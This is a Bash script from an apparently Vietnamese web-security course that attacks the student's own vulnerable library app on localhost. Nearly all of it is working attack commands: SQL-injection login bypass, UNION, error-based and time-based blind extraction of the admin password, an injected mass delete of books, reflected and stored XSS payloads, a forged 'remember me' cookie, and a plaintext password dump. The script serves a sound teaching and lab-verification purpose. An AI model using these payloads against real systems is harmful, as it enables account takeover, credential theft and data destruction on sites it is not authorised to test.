#!/bin/bash
# tan-cong.sh — bài 6.3: tấn công CHÍNH BẢN LAB CỦA BẠN (localhost) để thấy lỗ hổng là thật; chạy lại sau khi vá để thấy đã chặn.
# ⚠️ Chỉ chạy vào máy của mình. Tấn công hệ thống người khác khi chưa được phép là phạm luật (Điều 289 BLHS 2015 — xem bài 6.3).
# Dùng: B=http://localhost:18080/thuvien NAP="docker compose exec -T db mysql --default-character-set=utf8mb4 -uroot -p123456 thuvien" bash tan-cong.sh
B=${B:-http://localhost:18080/thuvien}
NAP=${NAP:-docker compose exec -T db mysql --default-character-set=utf8mb4 -uroot -p123456 thuvien}
{ echo "DROP PROCEDURE IF EXISTS sp_overdue_report;"; cat db/thuvien.sql; } | $NAP 2>/dev/null     # dữ liệu sạch
cj=$(mktemp); cj2=$(mktemp)
chay() { echo "\$ $1"; eval "$1"; echo; }
curl -s -c $cj -o /dev/null -d "username=thuthu&password=123456" $B/login                         # thủ thư đăng nhập đàng hoàng

echo "## 1. Vào bằng tài khoản admin mà không cần mật khẩu"
chay "curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}' --data-urlencode \"username=admin' -- \" -d password=bat-ky \$B/login"

echo "## 2. UNION qua ô tìm kiếm: đọc bảng users"
chay "curl -s -b \$cj -G --data-urlencode \"q=zzz' UNION SELECT id, username, password, role, 0, 0 FROM users -- \" \$B/books | grep -E '<td>[^<]*</td>' | head -8"

echo "## 3. Error-based: thông báo lỗi in thẳng dữ liệu"
chay "curl -s -b \$cj -d 'action=borrow&bookId=1' --data-urlencode \"readerId=2 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users WHERE username='admin')))\" \$B/books"

echo "## 4. Blind theo thời gian: hỏi có/không từng ký tự"
for c in a d; do chay "curl -s -b \$cj -o /dev/null -w '$c: %{time_total}s' -d 'action=borrow&bookId=1' --data-urlencode \"readerId=2 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='$c',SLEEP(2),0)\" \$B/books"; done

echo "## 5. Chức năng không có nút (xoaSach) vẫn gọi được — và nối chuỗi"
chay "curl -s -b \$cj -o /dev/null -w '%{http_code}' --data-urlencode 'id=0 OR id NOT IN (SELECT book_id FROM loans)' -d action=delete \$B/books"
chay "echo 'SELECT COUNT(*) AS con_lai FROM books;' | \$NAP 2>/dev/null"
{ echo "DROP PROCEDURE IF EXISTS sp_overdue_report;"; cat db/thuvien.sql; } | $NAP 2>/dev/null

echo "## 6. XSS phản chiếu qua tham số msg"
chay "curl -s -b \$cj -G --data-urlencode 'msg=<script>alert(document.cookie)</script>' \$B/books | grep -n script"

echo "## 7. XSS lưu trữ: tên sách chứa mã"
chay "curl -s -b \$cj -o /dev/null -w '%{http_code}' -d action=add -d code=X99 --data-urlencode 'title=<img src=x onerror=alert(1)>' -d author=a -d quantity=1 \$B/books"
chay "curl -s -b \$cj \$B/books | grep -n onerror"

echo "## 8. Cookie 'ghi nhớ' giả được cho bất kỳ ai (bí mật nằm trong mã nguồn)"
chay "curl -s -D - -o /dev/null -d 'username=thuthu&password=123456&remember=on' \$B/login | grep -i '^set-cookie: remember'"
chay "T=\$(printf '%s' 'adminthuvien2016' | md5sum | cut -d' ' -f1); curl -s -c \$cj2 -o /dev/null -w '%{http_code} -> %{redirect_url}' -b \"remember=admin:\$T\" \$B/login"
chay "curl -s -b \$cj2 \$B/books | grep -o 'Xin ch[^|]*'"

echo "## 9. Mật khẩu lưu thô"
chay "echo 'SELECT username, password FROM users;' | \$NAP 2>/dev/null"
rm -f $cj $cj2
